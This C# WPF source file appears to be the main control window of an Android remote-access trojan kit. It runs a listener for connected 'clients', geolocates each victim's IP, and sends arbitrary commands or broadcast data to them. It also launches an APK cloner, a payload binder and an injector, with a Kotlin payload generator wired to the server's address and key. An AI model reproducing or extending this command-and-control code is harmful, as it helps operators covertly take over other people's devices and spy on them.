using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Input;
using System.Windows.Media;
using System.Windows.Threading;
using TcpServerApp.Models;
using TcpServerApp.Services;
using TcpServerApp.Services.Elite;
using TcpServerApp.Services.Elite.Security;
using TcpServerApp.Services.Elite.Build;
using TcpServerApp.Services.Elite.Networking;
using TcpServerApp.Services.Elite.Geo;


namespace TcpServerApp
{
    public partial class MainWindow : Window
    {
        private TcpListener? _tcpListener;
        private CancellationTokenSource? _cancellationTokenSource;
        private Dictionary<int, ClientInfo> _clients = new Dictionary<int, ClientInfo>();
        private Dictionary<int, CancellationTokenSource> _clientCancellations = new Dictionary<int, CancellationTokenSource>();
        private int _clientCounter = 0;
        private DispatcherTimer _updateTimer;
        private DateTime _serverStartTime;
        private long _totalBytesReceived = 0;
        private long _totalBytesSent = 0;
        private GeoIPService _geoIPService = new GeoIPService();
        private ApkClonerWindow? _apkClonerWindow;
        
        // Elite Research Core
        private EliteDB _eliteDb;
        private ClientRepository _eliteRepo;
        private BinderService _eliteBinderService;
        private AdvancedPayloadConfig _payloadTemplate;
        private InjectorService _injectorService;
        private EliteNetworkListener _eliteServer;
        private KotlinPayloadGenerator _kotlinGenerator;

        public MainWindow()
        {
            InitializeComponent();
            
            // Initialize Notification Manager
            NotificationManager.Instance.Initialize(NotificationStackPanel);
            
            LogMessage("✨ تم تهيئة التطبيق بنجاح - مرحباً بك في خادم TCP المتقدم");
            NotificationManager.Instance.Success("مرحباً بك في خادم TCP المتقدم", "تم التهيئة");

            // Initialize Elite Research Engine
            _eliteDb = new EliteDB();
            _eliteRepo = new ClientRepository(_eliteDb);
            _eliteBinderService = new BinderService();
            _payloadTemplate = new AdvancedPayloadConfig();
            _injectorService = new InjectorService(msg => LogMessage(msg));
            _kotlinGenerator = new KotlinPayloadGenerator();
            _eliteServer = new EliteNetworkListener(_eliteRepo, _kotlinGenerator);

            // Wire Elite Core Events
            _eliteServer.OnLog += (msg) => Dispatcher.Invoke(() => LogMessage(msg));
            _eliteServer.OnClientListChanged += () => Dispatcher.Invoke(() => RefreshClientList());
            
            // عرض عنوان IP المحلي
            try
            {
                var host = System.Net.Dns.GetHostEntry(System.Net.Dns.GetHostName());
                var localIP = host.AddressList.FirstOrDefault(ip => ip.AddressFamily == System.Net.Sockets.AddressFamily.InterNetwork);
                LocalIPText.Text = localIP?.ToString() ?? "127.0.0.1";
            }
            catch
            {
                LocalIPText.Text = "127.0.0.1";
            }
            
            // Timer لتحديث معلومات العملاء والإحصائيات
            _updateTimer = new DispatcherTimer();
            _updateTimer.Interval = TimeSpan.FromSeconds(1);
            _updateTimer.Tick += UpdateTimer_Tick;
            _updateTimer.Start();
        }

        // Window Control Methods
        private void TitleBar_MouseLeftButtonDown(object sender, MouseButtonEventArgs e)
        {
            if (e.ClickCount == 2)
            {
                WindowState = WindowState == WindowState.Maximized ? WindowState.Normal : WindowState.Maximized;
            }
            else
            {
                DragMove();
            }
        }

        private void Minimize_Click(object sender, RoutedEventArgs e)
        {
            WindowState = WindowState.Minimized;
        }

        private void Maximize_Click(object sender, RoutedEventArgs e)
        {
            WindowState = WindowState == WindowState.Maximized ? WindowState.Normal : WindowState.Maximized;
        }

        private void Close_Click(object sender, RoutedEventArgs e)
        {
            Close();
        }

        private void OpenApkStudio_Click(object sender, RoutedEventArgs e)
        {
            try
            {
                var apkStudio = new ApkStudioWindow();
                apkStudio.Show();
                LogMessage("📱 تم فتح APK Studio");
            }
            catch (Exception ex)
            {
                LogMessage($"❌ خطأ في فتح APK Studio: {ex.Message}");
                NotificationManager.Instance.Error($"خطأ في فتح APK Studio: {ex.Message}", "خطأ");
            }
        }

        private void OpenSmartBinder_Click(object sender, RoutedEventArgs e)
        {
            try
            {
                // ── مزامنة إعدادات الخادم مع SmartBinder ──────────────────
                bool   serverRunning = _eliteServer.IsRunning;
                string serverHost    = LocalIPText.Text ?? "127.0.0.1";
                int    serverPort    = 0;
                string serverKey     = AuthKeyTextBox.Text ?? "";
                bool   requireKey    = RequireAuthCheckBox.IsChecked == true;

                int.TryParse(PortTextBox.Text, out serverPort);

                // إنشاء SmartBinder مع تمرير إعدادات الخادم النشط
                var smartBinder = serverRunning
                    ? new SmartBinderView(serverHost, serverPort, requireKey ? serverKey : "", serverRunning)
                    : new SmartBinderView();

                smartBinder.Owner = this;
                smartBinder.Show();

                string syncMsg = serverRunning
                    ? $"📦 تم فتح Smart Binder — مزامن مع الخادم النشط ({serverHost}:{serverPort})"
                    : "📦 تم فتح Smart Binder — الخادم غير نشط، يمكنك إدخال الإعدادات يدوياً";

                LogMessage(syncMsg);
                NotificationManager.Instance.Success(
                    serverRunning ? $"مزامن مع الخادم :{serverPort}" : "الخادم غير نشط",
                    "Smart Binder");
            }
            catch (Exception ex)
            {
                LogMessage($"❌ خطأ في فتح Smart Binder: {ex.Message}");
                NotificationManager.Instance.Error($"خطأ في فتح Smart Binder: {ex.Message}", "خطأ");
            }
        }
		
        private void BtnApkCloner_Click(object sender, RoutedEventArgs e)
        {
            _apkClonerWindow = new ApkClonerWindow { Owner = this };
            _apkClonerWindow.Show();
        }

        private void ClearLog_Click(object sender, RoutedEventArgs e)
        {
            LogTextBox.Clear();
            LogMessage("🗑️ تم مسح السجل");
        }

        private void UpdateTimer_Tick(object? sender, EventArgs e)
        {
            // تحديث مدة الاتصال لكل عميل
            foreach (var client in _clients.Values)
            {
                client.OnPropertyChanged(nameof(client.ConnectedDuration));
            }

            // تحديث وقت التشغيل
            if (_eliteServer.IsRunning)
            {
                var uptime = DateTime.Now - _serverStartTime;
                UptimeText.Text = $"{uptime.Hours:D2}:{uptime.Minutes:D2}:{uptime.Seconds:D2}";
            }

            // تحديث الإحصائيات
            UpdateStatistics();
        }

        private async void StartButton_Click(object sender, RoutedEventArgs e)
        {
            if (!int.TryParse(PortTextBox.Text, out int port) || port < 1 || port > 65535)
            {
                NotificationManager.Instance.Warning("رقم المنفذ غير صحيح! يجب أن يكون بين 1 و 65535", "خطأ في المنفذ");
                return;
            }

            try
            {
                // Start the Elite Research Listener
                await _eliteServer.StartAsync(new int[] { port });
                
                _serverStartTime = DateTime.Now;
                UpdateServerStatus(true);
                StartTimeText.Text = _serverStartTime.ToString("yyyy-MM-dd HH:mm:ss");
                
                LogMessage($"✅ [Research Core] بدأت المحركات المتقدمة على المنفذ {port}");
                NotificationManager.Instance.Success($"خادم Elite يعمل الآن على المنفذ {port}", "تم بدء الخادم");
            }
            catch (Exception ex)
            {
                LogMessage($"❌ خطأ في تشغيل محرك البحث: {ex.Message}");
                NotificationManager.Instance.Error($"فشل تشغيل المحرك: {ex.Message}", "خطأ");
                UpdateServerStatus(false);
            }
        }

        private void StopButton_Click(object sender, RoutedEventArgs e)
        {
            StopServer();
        }

        private void StopServer()
        {
            _eliteServer.StopServer();
            
            _clients.Clear();
            _clientCancellations.Clear();
            ConnectionsItemsControl.Children.Clear();
            _clientCounter = 0;
            UpdateConnectionCount();
            
            UpdateServerStatus(false);
            StartTimeText.Text = "--";
            LogMessage("⏹ تم إيقاف محرك البحث");
            NotificationManager.Instance.Warning("تم إيقاف خادم Elite بنجاح", "إيقاف الخادم");
        }

        private void RefreshClientList()
        {
            ConnectionsItemsControl.Children.Clear();
            _clients.Clear();
            
            int id = 1;
            foreach (var kvp in _eliteServer.ActiveClients)
            {
                string eliteId = kvp.Key;
                TcpClient tcpClient = kvp.Value;
                
                var clientInfo = new ClientInfo(tcpClient, id++)
                {
                    // Map Elite ID as tag or use it for ClientName
                };
                
                _clients[clientInfo.Id] = clientInfo;
                AddClientCard(clientInfo);
            }
            UpdateConnectionCount();
        }

        private void UpdateConnectionCount()
        {
            int count = _eliteServer.ActiveClients.Count;
            Dispatcher.Invoke(() => 
            {
                TotalConnectionsText.Text = count.ToString();
                LogMessage($"📊 عدد العقد المتصلة حالياً: {count}");
            });
        }

        private void AddClientCard(ClientInfo clientInfo)
        {
            var card = new ClientCard { DataContext = clientInfo };
            card.SendDataRequested += ClientCard_SendDataRequested;
            card.ShowDetailsRequested += ClientCard_ShowDetailsRequested;
            card.DisconnectRequested += ClientCard_DisconnectRequested;
            card.SendCommandRequested += ClientCard_SendCommandRequested;
            card.SnapshotRequested += ClientCard_SnapshotRequested;
            card.ShowLogRequested += ClientCard_ShowLogRequested;
            card.SettingsRequested += ClientCard_SettingsRequested;
            
            ConnectionsItemsControl.Children.Add(card);
        }

        private async Task LoadGeoIPInfoAsync(ClientInfo clientInfo)
        {
            try
            {
                var geoInfo = await _geoIPService.GetGeoIPInfoAsync(clientInfo.RemoteEndPoint);
                
                Dispatcher.Invoke(() =>
                {
                    clientInfo.GeoInfo = geoInfo;
                    LogMessage($"🌍 {clientInfo.ClientName}: الموقع - {geoInfo.Flag} {geoInfo.City}, {geoInfo.Country} ({geoInfo.ISP})");
                });
            }
            catch (Exception ex)
            {
                Dispatcher.Invoke(() =>
                {
                    LogMessage($"⚠️ {clientInfo.ClientName}: فشل تحميل معلومات الموقع - {ex.Message}");
                });
            }
        }

        private void ClientCard_SendDataRequested(object? sender, ClientInfo clientInfo)
        {
            var dialog = new SendDataDialog(clientInfo);
            dialog.Owner = this;
            
            if (dialog.ShowDialog() == true)
            {
                var data = dialog.DataToSend;
                var dataType = dialog.DataType;
                
                _ = SendDataToClientAsync(clientInfo, data, dataType);
            }
        }

        private async Task SendDataToClientAsync(ClientInfo clientInfo, byte[] data, string dataType)
        {
            try
            {
                if (!clientInfo.TcpClient.Connected)
                {
                    NotificationManager.Instance.Warning($"{clientInfo.ClientName} غير متصل", "تحذير");
                    return;
                }

                var stream = clientInfo.TcpClient.GetStream();
                await stream.WriteAsync(data, 0, data.Length);
                
                clientInfo.BytesSent += data.Length;
                clientInfo.LastActivity = DateTime.Now;
                
                var hexData = BitConverter.ToString(data, 0, Math.Min(data.Length, 20)).Replace("-", " ");
                LogMessage($"📤 {clientInfo.ClientName}: إرسال {data.Length} بايت ({dataType})\n" +
                         $"   البيانات: {hexData}...");
                NotificationManager.Instance.Data($"تم إرسال {data.Length} بايت", clientInfo.ClientName);
            }
            catch (Exception ex)
            {
                LogMessage($"❌ فشل إرسال البيانات إلى {clientInfo.ClientName}: {ex.Message}");
                NotificationManager.Instance.Error($"فشل الإرسال: {ex.Message}", "خطأ");
            }
        }

        private void ClientCard_ShowDetailsRequested(object? sender, ClientInfo clientInfo)
        {
            var details = new ClientDetailsDialog(clientInfo);
            details.Owner = this;
            details.ShowDialog();
        }

        private void ClientCard_DisconnectRequested(object? sender, ClientInfo clientInfo)
        {
            DisconnectClient(clientInfo.Id);
            LogMessage($"🔌 {clientInfo.ClientName}: تم قطع الاتصال يدوياً");
            NotificationManager.Instance.Warning($"تم قطع اتصال {clientInfo.ClientName}", "قطع الاتصال");
        }

        private async void ClientCard_SendCommandRequested(object? sender, (ClientInfo, string) data)
        {
            var (clientInfo, command) = data;
            try
            {
                if (!clientInfo.TcpClient.Connected)
                {
                    NotificationManager.Instance.Warning($"{clientInfo.ClientName} غير متصل", "تحذير");
                    return;
                }

                var commandData = Encoding.UTF8.GetBytes(command);
                var stream = clientInfo.TcpClient.GetStream();
                await stream.WriteAsync(commandData, 0, commandData.Length);
                
                clientInfo.BytesSent += commandData.Length;
                clientInfo.LastActivity = DateTime.Now;
                _totalBytesSent += commandData.Length;
                
                LogMessage($"⚡ {clientInfo.ClientName}: إرسال أمر '{command}'");
                NotificationManager.Instance.Info($"تم إرسال الأمر '{command}'", clientInfo.ClientName);
            }
            catch (Exception ex)
            {
                LogMessage($"❌ فشل إرسال الأمر إلى {clientInfo.ClientName}: {ex.Message}");
                NotificationManager.Instance.Error($"فشل إرسال الأمر: {ex.Message}", "خطأ");
            }
        }

        private void ClientCard_SnapshotRequested(object? sender, ClientInfo clientInfo)
        {
            try
            {
                var timestamp = DateTime.Now.ToString("yyyyMMdd_HHmmss");
                var filename = $"Client_{clientInfo.Id}_Snapshot_{timestamp}.txt";
                
                var snapshot = new StringBuilder();
                snapshot.AppendLine("═══════════════════════════════════════");
                snapshot.AppendLine($"   لقطة حالة العميل - {clientInfo.ClientName}");
                snapshot.AppendLine("═══════════════════════════════════════");
                snapshot.AppendLine();
                snapshot.AppendLine($"📅 التاريخ: {DateTime.Now:yyyy-MM-dd HH:mm:ss}");
                snapshot.AppendLine($"🔗 ID: {clientInfo.Id}");
                snapshot.AppendLine($"📍 العنوان: {clientInfo.RemoteEndPoint}");
                snapshot.AppendLine($"✅ الحالة: {clientInfo.Status}");
                snapshot.AppendLine();
                snapshot.AppendLine("─────────────────────────────────────");
                snapshot.AppendLine("📊 الإحصائيات");
                snapshot.AppendLine("─────────────────────────────────────");
                snapshot.AppendLine($"📥 البيانات المستلمة: {clientInfo.BytesReceivedFormatted}");
                snapshot.AppendLine($"📤 البيانات المرسلة: {clientInfo.BytesSentFormatted}");
                snapshot.AppendLine($"🕐 مدة الاتصال: {clientInfo.ConnectedDuration}");
                snapshot.AppendLine($"⏱️ آخر نشاط: {clientInfo.LastActivityFormatted}");
                snapshot.AppendLine($"🔌 وقت الاتصال: {clientInfo.ConnectedAt:yyyy-MM-dd HH:mm:ss}");
                snapshot.AppendLine();
                snapshot.AppendLine("═══════════════════════════════════════");
                
                System.IO.File.WriteAllText(filename, snapshot.ToString(), Encoding.UTF8);
                LogMessage($"📸 {clientInfo.ClientName}: تم حفظ اللقطة في {filename}");
                NotificationManager.Instance.Success($"تم حفظ لقطة {clientInfo.ClientName}", "حفظ اللقطة");
            }
            catch (Exception ex)
            {
                LogMessage($"❌ فشل حفظ اللقطة: {ex.Message}");
                NotificationManager.Instance.Error($"فشل حفظ اللقطة: {ex.Message}", "خطأ");
            }
        }

        private void ClientCard_ShowLogRequested(object? sender, ClientInfo clientInfo)
        {
            var logDialog = new ClientLogDialog(clientInfo);
            logDialog.Owner = this;
            logDialog.ShowDialog();
        }

        private void ClientCard_SettingsRequested(object? sender, ClientInfo clientInfo)
        {
            MessageBox.Show(
                $"إعدادات العميل: {clientInfo.ClientName}\n\n" +
                $"هذه الميزة قيد التطوير...\n\n" +
                $"ستتمكن قريباً من:\n" +
                $"• تغيير معدل الإرسال\n" +
                $"• تعيين حدود البيانات\n" +
                $"• تخصيص الأوامر\n" +
                $"• إدارة الأولويات",
                "إعدادات العميل",
                MessageBoxButton.OK,
                MessageBoxImage.Information);
        }

        private void DisconnectClient(int clientId)
        {
            Dispatcher.Invoke(() =>
            {
                if (_clients.TryGetValue(clientId, out var clientInfo))
                {
                    clientInfo.Status = "غير متصل";
                    
                    if (_clientCancellations.TryGetValue(clientId, out var cts))
                    {
                        cts.Cancel();
                        _clientCancellations.Remove(clientId);
                    }

                    try
                    {
                        clientInfo.TcpClient.Close();
                    }
                    catch { }

                    _clients.Remove(clientId);
                    
                    // إزالة البطاقة من الواجهة
                    var cardToRemove = ConnectionsItemsControl.Children.OfType<ClientCard>()
                        .FirstOrDefault(c => (c.DataContext as ClientInfo)?.Id == clientId);
                    
                    if (cardToRemove != null)
                    {
                        ConnectionsItemsControl.Children.Remove(cardToRemove);
                    }

                    UpdateConnectionCount();
                    LogMessage($"🔌 {clientInfo.ClientName}: تم قطع الاتصال");
                }
            });
        }


        private void UpdateServerStatus(bool isRunning)
        {
            if (isRunning)
            {
                StatusText.Text = "يعمل";
                StatusText.Foreground = new SolidColorBrush(Color.FromRgb(40, 167, 69));
                StatusIndicator.Fill = new SolidColorBrush(Color.FromRgb(40, 167, 69));
                StartButton.IsEnabled = false;
                StopButton.IsEnabled = true;
                PortTextBox.IsEnabled = false;
            }
            else
            {
                StatusText.Text = "متوقف";
                StatusText.Foreground = new SolidColorBrush(Color.FromRgb(255, 165, 0));
                StatusIndicator.Fill = new SolidColorBrush(Color.FromRgb(255, 165, 0));
                StartButton.IsEnabled = true;
                StopButton.IsEnabled = false;
                PortTextBox.IsEnabled = true;
            }
        }

        private void LogMessage(string message)
        {
            var timestamp = DateTime.Now.ToString("HH:mm:ss");
            LogTextBox.AppendText($"[{timestamp}] {message}\n");
            LogTextBox.ScrollToEnd();
        }

        private void UpdateStatistics()
        {
            ActiveClientsText.Text = _clients.Count.ToString();
            TotalReceivedText.Text = FormatBytes(_totalBytesReceived);
            TotalSentText.Text = FormatBytes(_totalBytesSent);
        }

        private string FormatBytes(long bytes)
        {
            if (bytes < 1024) return $"{bytes} B";
            if (bytes < 1024 * 1024) return $"{bytes / 1024.0:F2} KB";
            if (bytes < 1024 * 1024 * 1024) return $"{bytes / (1024.0 * 1024.0):F2} MB";
            return $"{bytes / (1024.0 * 1024.0 * 1024.0):F2} GB";
        }

        private void SaveLog_Click(object sender, RoutedEventArgs e)
        {
            try
            {
                var timestamp = DateTime.Now.ToString("yyyyMMdd_HHmmss");
                var filename = $"ServerLog_{timestamp}.txt";
                System.IO.File.WriteAllText(filename, LogTextBox.Text);
                NotificationManager.Instance.Success($"تم حفظ السجل: {filename}", "حفظ السجل");
                LogMessage($"💾 تم حفظ السجل في: {filename}");
            }
            catch (Exception ex)
            {
                NotificationManager.Instance.Error($"فشل حفظ السجل: {ex.Message}", "خطأ");
            }
        }

        private void BroadcastData_Click(object sender, RoutedEventArgs e)
        {
            // Close popup if open
            QuickActionsPopup.IsOpen = false;
            
            if (_clients.Count == 0)
            {
                NotificationManager.Instance.Warning("لا يوجد عملاء متصلين", "تحذير");
                return;
            }

            var firstClient = _clients.Values.First();
            var dialog = new SendDataDialog(firstClient);
            dialog.Owner = this;
            dialog.Title = "إرسال بيانات لجميع العملاء";
            
            if (dialog.ShowDialog() == true)
            {
                var data = dialog.DataToSend;
                var dataType = dialog.DataType;
                
                foreach (var client in _clients.Values.ToList())
                {
                    _ = SendDataToClientAsync(client, data, dataType);
                }
                
                NotificationManager.Instance.Data($"تم إرسال البيانات لـ {_clients.Count} عميل", "إرسال جماعي");
                LogMessage($"📡 تم إرسال البيانات لجميع العملاء ({_clients.Count})");
            }
        }

        private void DisconnectAll_Click(object sender, RoutedEventArgs e)
        {
            // Close popup if open
            QuickActionsPopup.IsOpen = false;
            
            if (_clients.Count == 0)
            {
                NotificationManager.Instance.Warning("لا يوجد عملاء متصلين", "تحذير");
                return;
            }

            var result = MessageBox.Show(
                $"هل تريد قطع اتصال جميع العملاء ({_clients.Count})؟",
                "تأكيد قطع الاتصال",
                MessageBoxButton.YesNo,
                MessageBoxImage.Question);

            if (result == MessageBoxResult.Yes)
            {
                var count = _clients.Count;
                foreach (var clientId in _clients.Keys.ToList())
                {
                    DisconnectClient(clientId);
                }
                NotificationManager.Instance.Warning($"تم قطع اتصال {count} عميل", "قطع الاتصال");
                LogMessage($"🔌 تم قطع اتصال جميع العملاء ({count})");
            }
        }

        private void ExportStats_Click(object sender, RoutedEventArgs e)
        {
            // Close popup if open
            QuickActionsPopup.IsOpen = false;
            
            try
            {
                var timestamp = DateTime.Now.ToString("yyyyMMdd_HHmmss");
                var filename = $"ServerStats_{timestamp}.txt";
                
                var stats = new StringBuilder();
                stats.AppendLine("╔════════════════════════════════════════════╗");
                stats.AppendLine("║       إحصائيات خادم TCP المتقدم           ║");
                stats.AppendLine("╚════════════════════════════════════════════╝");
                stats.AppendLine();
                stats.AppendLine($"📅 التاريخ: {DateTime.Now:yyyy-MM-dd HH:mm:ss}");
                stats.AppendLine($"🔌 المنفذ: {PortTextBox.Text}");
                stats.AppendLine($"⏱️ وقت التشغيل: {UptimeText.Text}");
                stats.AppendLine($"🔐 مفتاح الاتصال: {(RequireAuthCheckBox.IsChecked == true ? "مفعّل" : "معطّل")}");
                stats.AppendLine();
                stats.AppendLine("─────────────────────────────────────────────");
                stats.AppendLine("📊 الإحصائيات العامة");
                stats.AppendLine("─────────────────────────────────────────────");
                stats.AppendLine($"👥 العملاء النشطين: {_clients.Count}");
                stats.AppendLine($"📥 إجمالي الاستلام: {TotalReceivedText.Text}");
                stats.AppendLine($"📤 إجمالي الإرسال: {TotalSentText.Text}");
                stats.AppendLine();
                
                if (_clients.Count > 0)
                {
                    stats.AppendLine("─────────────────────────────────────────────");
                    stats.AppendLine("👥 قائمة العملاء المتصلين");
                    stats.AppendLine("─────────────────────────────────────────────");
                    
                    foreach (var client in _clients.Values)
                    {
                        stats.AppendLine();
                        stats.AppendLine($"🔹 {client.ClientName}");
                        stats.AppendLine($"   📍 العنوان: {client.RemoteEndPoint}");
                        stats.AppendLine($"   📥 الاستلام: {client.BytesReceivedFormatted}");
                        stats.AppendLine($"   📤 الإرسال: {client.BytesSentFormatted}");
                        stats.AppendLine($"   🕐 مدة الاتصال: {client.ConnectedDuration}");
                        stats.AppendLine($"   ⏱️ آخر نشاط: {client.LastActivityFormatted}");
                        stats.AppendLine($"   ✅ الحالة: {client.Status}");
                    }
                }
                
                stats.AppendLine();
                stats.AppendLine("═════════════════════════════════════════════");
                stats.AppendLine($"تم إنشاء التقرير بواسطة خادم TCP المتقدم");
                stats.AppendLine("═════════════════════════════════════════════");
                
                System.IO.File.WriteAllText(filename, stats.ToString(), Encoding.UTF8);
                NotificationManager.Instance.Success($"تم تصدير الإحصائيات: {filename}", "تصدير الإحصائيات");
                LogMessage($"📊 تم تصدير الإحصائيات في: {filename}");
            }
            catch (Exception ex)
            {
                NotificationManager.Instance.Error($"فشل تصدير الإحصائيات: {ex.Message}", "خطأ");
            }
        }

        private void QuickActions_Click(object sender, RoutedEventArgs e)
        {
            QuickActionsPopup.IsOpen = !QuickActionsPopup.IsOpen;
        }

        protected override void OnClosing(System.ComponentModel.CancelEventArgs e)
        {
            _updateTimer.Stop();
            StopServer();
            base.OnClosing(e);
        }
    }
}
